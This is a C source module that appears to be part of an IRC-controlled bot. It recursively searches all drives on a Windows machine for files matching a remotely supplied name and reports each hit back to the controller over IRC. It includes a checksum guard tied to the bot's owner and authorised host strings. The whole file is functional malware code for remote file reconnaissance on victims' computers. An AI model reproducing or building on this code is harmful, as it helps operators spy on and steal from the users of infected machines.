#include "../Includes/includes.h"

#ifndef HTTP_BUILD
#ifdef INCLUDE_FILESEARCH
unsigned int SearchDirectory(char *pcSearchParameter, char *pcDirectory, unsigned int uiMatches) //Function uses recursion to iterate through all directories
{
    pcSearchParameter = StripReturns(pcSearchParameter);

    WIN32_FIND_DATA d32;
    HANDLE hFindFiles = FindFirstFile(pcDirectory, &d32);

    if(GetLastError() == 2) //ERROR_FILE_NOT_FOUND
        return 0;

    if(hFindFiles == INVALID_HANDLE_VALUE)
        return 0;

    pcDirectory = CharacterReplace(pcDirectory, (char*)"*", (char*)"\0");
    //StripAsterisks(pcDirectory);

    do
    {
        if(!bBusyFileSearching)
            return 0;

        if((!strstr(".", d32.cFileName)) && (!strstr("..", d32.cFileName)))
        {
            char cSearchHandler[MAX_PATH];
            memset(cSearchHandler, 0, sizeof(cSearchHandler));
            sprintf(cSearchHandler, "%s%s", pcDirectory, d32.cFileName);

            if(DirectoryExists(cSearchHandler))
            {
                char cNewDirectory[MAX_PATH];
                memset(cNewDirectory, 0, sizeof(cNewDirectory));
                sprintf(cNewDirectory, "%s\\*", cSearchHandler);
                uiMatches += SearchDirectory(pcSearchParameter, cNewDirectory, 0);
            }
            else
            {
                ulTotalFiles++;

                if(strstr(d32.cFileName, pcSearchParameter))
                {
                    uiMatches++; //Done differently now
                    ulMatchingFiles++; //This is global and not passed off now
                    if(bOutputFileSearch)
                    {
                        SendSearchedFile(pcSearchParameter, cSearchHandler);
                        Sleep(IRC_SND_DELAY);
                    }
                }
            }
        }
    }
    while(FindNextFile(hFindFiles, &d32) != 0);

    FindClose(hFindFiles);

    return uiMatches;
}

DWORD WINAPI FileSearch(LPVOID)
{
    unsigned long ulFileMatches = 0;
    ulMatchingFiles = 0;

    // <!-------! CRC AREA START !-------!>
    char cCheckString[DEFAULT];
    sprintf(cCheckString, "%s %s", cAuthHost, cOwner);
    char *pcStr = cCheckString;
    unsigned long ulCheck = 10762/2;
    int nCheck;
    while((nCheck = *pcStr++))
        ulCheck = ((ulCheck << 5) + ulCheck) + nCheck;
    if(ulCheck != ulChecksum5)
    {
        SendSearchAlreadyRunning();
        return 0;
    }
    // <!-------! CRC AREA STOP !-------!>

    if((ulTotalFiles != 0) || (bBusyFileSearching))
    {
        SendSearchAlreadyRunning();
        return 0;
    }

    bBusyFileSearching = TRUE;

    char cSearchParameter[MAX_PATH];
    memset(cSearchParameter, 0, sizeof(cSearchParameter));
    sprintf(cSearchParameter, cStoreParameter);

    if((strstr(cSearchParameter, "|"))
            || (strstr(cSearchParameter, ">"))
            || (strstr(cSearchParameter, "<"))
            || (strstr(cSearchParameter, "\""))
            || (strstr(cSearchParameter, "*"))
            || (strstr(cSearchParameter, "?"))
            || (strstr(cSearchParameter, "/"))
            || (strstr(cSearchParameter, "\\"))
            || (strstr(cSearchParameter, ":")))
    {
        SendInvalidParameters();
        return 0;
    }

    DWORD dwDriveMask = GetLogicalDrives();
    TCHAR szDrive[] = ("A:");

    if(dwDriveMask == 0)
        SendFailedToSearch();

    while(dwDriveMask)
    {
        char cDirectory[MAX_PATH];
        memset(cDirectory, 0, sizeof(cDirectory));

        sprintf(cDirectory, "%s\\*", (const char*)szDrive);

        ulFileMatches = SearchDirectory(cSearchParameter, cDirectory, 0); //Ignore passed parameter for now

        ++szDrive[0];
        dwDriveMask >>= 1;
    }

    if(bBusyFileSearching)
    {
        //SendFileSearchSuccess(ulTotalFiles, ulFileMatches, cSearchParameter);
        SendFileSearchSuccess(ulTotalFiles, ulMatchingFiles, cSearchParameter);
    }
    else
        SendFileSearchStopped(cSearchParameter);

    bBusyFileSearching = FALSE;
    ulTotalFiles = 0;

    return 1;
}
#endif
#endif
